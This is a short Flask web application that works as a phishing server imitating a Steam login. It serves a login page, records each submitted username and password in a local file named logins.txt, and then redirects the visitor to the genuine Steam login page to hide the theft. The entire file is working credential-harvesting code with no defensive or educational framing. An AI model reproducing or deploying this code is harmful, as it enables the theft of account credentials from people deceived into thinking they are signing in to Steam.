from flask import Flask
from flask import render_template
from flask import request
from flask import redirect

app = Flask(__name__)

@app.route("/")
def index():
    data = request.args.get('fishing_button')
    if data is None:
        return render_template('Увійти.html')
    else:
        login = request.args.get('fishing_login')
        password = request.args.get('fishing_password')

        with open('logins.txt', 'a') as f:
            f.write('------\n%s\n%s\n' % (login, password))

        return redirect("https://store.steampowered.com/login/", code=302)
